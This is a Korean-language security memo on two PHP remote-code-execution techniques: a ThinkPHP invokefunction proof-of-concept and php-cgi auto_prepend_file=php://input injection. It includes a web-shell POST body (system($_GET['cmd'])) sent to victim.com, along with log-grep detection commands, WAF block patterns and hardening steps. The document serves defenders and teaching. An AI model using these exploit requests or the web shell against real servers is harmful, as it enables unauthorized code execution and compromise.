## 📎 예제 1. ThinkPHP `invokefunction` POC (MD5 페이로드)

* 아래 페이로드는 `임의 함수 호출(POC)`, 성공하면 **RCE로 악용 가능**

```
/?s=../\think\Container/invokefunction
&function=call_user_func_array
&vars[0]=md5
&vars[1][]=HelloThinkPHP
```

* 의도: 내부에서 `call_user_func_array('md5', ['HelloThinkPHP'])` 실행 유도 → 응답으로 MD5가 나오면 호출 성공.


### 완전한 RCE가 되려면 (필수 조건)

1. 공격자가 `vars[0]` 등으로 `system`, `exec`, `shell_exec`, `eval` 등을 지정할 수 있어야 함
2. 서버/프레임워크가 **함수명 검증(화이트리스트)** 또는 **disable_functions** 같은 보호를 하지 않을 것
3. 함수 실행 결과가 외부로 노출되거나 파일 쓰기/명령 실행이 가능할 것


### 불완전(실패) 조건 예시

* `invokefunction` 접근에 인증/권한 필요
* 함수 호출 시 화이트리스트 적용
* `disable_functions`로 위험 함수 비활성화
* WAF/필터가 요청 차단
* 호출 결과가 외부에 노출되지 않음


### 즉시 탐지/확인

* 요청 패턴 로그 검색

  ```bash
  # nginx/apache 액세스 로그에서 탐지
  grep -R "invokefunction" /var/log/nginx* /var/log/apache2* 
  grep -R "call_user_func_array" /var/log/nginx* /var/log/apache2*
  grep -R "vars%5B0%5D" /var/log/nginx* /var/log/apache2*
  ```
* POC 응답 직접 확인 (서버가 MD5 반환시)

  ```bash
  # 로컬에서 MD5 확인 (예: HelloThinkPHP)
  echo -n "HelloThinkPHP" | md5sum
  ```
* PHP 환경 확인

  ```bash
  php -r "echo ini_get('disable_functions').PHP_EOL;"
  php -r "echo ini_get('open_basedir').PHP_EOL;"
  ```

### 예방법

1. WAF/방화벽에서 아래 패턴 차단:
   * `think\Container/invokefunction`
   * `call_user_func_array`
   * `vars[0]=`, `vars[1]=` 등의 인자 전달 패턴
2. ThinkPHP 버전 즉시 패치(공식 패치 적용)
3. `disable_functions` 에 `system, exec, shell_exec, passthru, popen, proc_open, eval` 등 추가 검토
4. `open_basedir`/파일 권한 제한, 웹 프로세스 쓰기권한 최소화
5. 전체 포렌식(응답으로 POC 성공 시 필수)

---
## 📎 예제 2. php-cgi(또는 php-cgi.exe) 취약점/오용을 이용한 원격코드실행(RCE)

**php-cgi(또는 php-cgi.exe)** 를 통해 PHP 런타임 설정을 조작해서 `php://input`(요청 바디)을 PHP 코드로 실행하게 만드는 기법.
php-cgi는 PHP 인터프리터의 CGI(Common Gateway Interface) 실행 파일로, PHP 코드를 해석·실행하는 프로그램 중 하나.

1. **php-cgi 바이너리가 외부에서 CGI 방식으로 직접 접근 가능**해야 함 (`/cgi-bin/php-cgi` 등).
2. 서버가 쿼리스트링의 `-d` 인자(또는 유사 설정)를 **실제로 처리/허용**해야 함(패치/설정으로 차단되지 않아야 함).
3. 요청의 쿼리스트링에 `-d auto_prepend_file=php://input`(또는 유사 지시문)이 **정확히 포함**되어야 함.
4. 요청 바디(POST) 에 **실행 가능한 PHP 코드**(예: `<?php ... ?>`)가 포함되어야 하고, 서버가 그 내용을 실행하도록 설정 변경이 가능해야 함.
5. WAF/방화벽/서버 설정이 요청을 차단하지 않아야 함.

### 페이로드 예시

HTTP GET 요청(쿼리 인코딩된 형태):

```
GET /cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input HTTP/1.1
Host: victim.com
...
```

그리고 바로 뒤에 POST 바디(요청 바디)에 실행할 PHP 코드:

```
<?php system($_GET['cmd']); ?>
```

또는 POC 단순 확인용:

```
<?php echo 'RCE_OK_12345'; ?>
```

이렇게 구성되면 php-cgi가 `auto_prepend_file=php://input`을 적용하여 요청 바디의 PHP 코드를 자동으로 포함·실행하게 되고, 응답 바디에 `RCE_OK_12345` 같은 토큰이 보이면 성공을 의미합니다

* URL은 반드시 올바르게 URL-인코딩 (예: `-d+auto_prepend_file=php://input` → `-d%20auto_prepend_file%3Dphp%3A%2F%2Finput`)


### 즉시 탐지/확인

* 액세스 로그에 `php-cgi` 또는 `php-cgi.exe` 호출이 있는지:

  ```bash
  grep -R "php-cgi" /var/log/nginx* /var/log/apache2*
  ```
* 의심 쿼리 문자열(`-d` 또는 `auto_prepend_file` 또는 `php://input`) 검색:

  ```bash
  grep -R "%2d\|auto_prepend_file\|php://input" /var/log/nginx* /var/log/apache2* || true
  ```
* HTTP 응답/애플리케이션 로그에 POC 토큰(예: `RCE_OK_` 또는 `33zVO2dZ...`) 검색:

  ```bash
  grep -R "RCE_OK_12345\|33zVO2dZw" /var/log/*
  ```
* 웹루트에 임의 파일 생성/변경 여부 확인(특히 .php 파일):

  ```bash
  find /var/www -type f -iname "*.php" -mtime -7 -ls
  ```




